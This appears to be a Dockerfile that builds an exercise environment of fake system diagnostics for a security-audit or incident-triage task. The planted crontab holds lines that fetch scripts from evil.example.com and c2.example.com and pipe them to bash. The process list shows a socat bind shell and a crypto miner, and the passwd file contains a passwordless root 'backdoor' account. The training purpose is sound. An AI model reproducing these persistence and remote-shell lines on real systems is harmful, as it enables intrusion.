FROM endless-base:latest
RUN <<'ENDSETUP'
#!/bin/bash
set -e

mkdir -p /home/user/diagnostics

# open_ports.txt
cat > /home/user/diagnostics/open_ports.txt << 'EOF'
Netid  State   Recv-Q  Send-Q  Local Address:Port  Peer Address:Port  Process
tcp    LISTEN  0       128     0.0.0.0:22           0.0.0.0:*
tcp    LISTEN  0       128     0.0.0.0:80           0.0.0.0:*
tcp    LISTEN  0       128     0.0.0.0:443          0.0.0.0:*
tcp    LISTEN  0       128     0.0.0.0:3306         0.0.0.0:*
tcp    LISTEN  0       128     0.0.0.0:4444         0.0.0.0:*
tcp    LISTEN  0       128     0.0.0.0:8080         0.0.0.0:*
tcp    LISTEN  0       128     0.0.0.0:31337        0.0.0.0:*
EOF

# processes.txt
cat > /home/user/diagnostics/processes.txt << 'EOF'
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.1  16952  1076 ?        Ss   08:00   0:01 /sbin/init
root         2  0.0  0.0      0     0 ?        S    08:00   0:00 [kthreadd]
root       101  0.0  0.2  65432  2048 ?        Ss   08:00   0:00 /usr/sbin/sshd
www-data   250  0.1  0.5 123456  5120 ?        S    08:01   0:05 /usr/sbin/apache2
root       312  0.0  0.1  12345  1024 ?        S    08:02   0:00 /usr/sbin/cron
mysql      400  0.2  2.1 456789 21504 ?        Sl   08:02   0:30 /usr/sbin/mysqld
user      1001  0.0  0.1  15000   900 pts/0    Ss   09:00   0:00 -bash
root      1050  5.0  1.2  98765 12288 ?        S    09:15   0:45 xmrig --pool=pool.minexmr.com
user      1102  0.0  0.0   6800   512 pts/1    S    09:20   0:00 nc -lvp 4444
root      1200  0.0  0.1  11000   800 ?        S    09:22   0:00 socat TCP-LISTEN:31337,fork EXEC:/bin/bash
user      1300  0.0  0.3  55000  3200 ?        S    09:25   0:02 /usr/bin/python3 app.py
EOF

# crontabs.txt
cat > /home/user/diagnostics/crontabs.txt << 'EOF'
# /etc/cron.d/sysmon
# System monitoring jobs
* * * * * root /usr/bin/check_disk.sh
0 2 * * * root /usr/bin/backup.sh
# /etc/cron.d/cleanup
15 3 * * 0 www-data /var/www/cleanup.sh
# malicious entries below
*/5 * * * * root curl http://evil.example.com/payload.sh | bash -i
0 4 * * * root wget -O /tmp/update http://c2.example.com/update && bash /tmp/update
30 1 * * * user echo dXNlcmFkZA== | base64 -d | bash
EOF

# passwd.txt
cat > /home/user/diagnostics/passwd.txt << 'EOF'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
mysql:x:106:112:MySQL Server:/var/lib/mysql:/bin/false
user:x:1000:1000:user:/home/user:/bin/bash
backdoor::0:0:backdoor account:/root:/bin/bash
svcaccount:x:1001:1001:service account:/home/svcaccount:/bin/bash
EOF

# suid_files.txt
cat > /home/user/diagnostics/suid_files.txt << 'EOF'
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/su
/usr/sbin/mount.nfs
/bin/mount
/bin/umount
/bin/ping
/sbin/unix_chkpwd
/tmp/rootkit
/opt/tools/privesc
/home/user/.local/suidshell
EOF

# file_perms.txt
cat > /home/user/diagnostics/file_perms.txt << 'EOF'
/etc/shadow permissions:
-rw-r----- 1 root shadow 1234 Jan  1 00:00 /etc/shadow

/etc/passwd permissions:
-rw-r--r-- 1 root root 2345 Jan  1 00:00 /etc/passwd

/tmp directory:
drwxrwxrwt 10 root root 4096 Jan  1 00:00 /tmp

/root directory:
drwx------ 5 root root 4096 Jan  1 00:00 /root

/home/user directory:
drwxr-xr-x 8 user user 4096 Jan  1 00:00 /home/user
EOF

chown -R user:user /home/user
ENDSETUP

WORKDIR /home/user
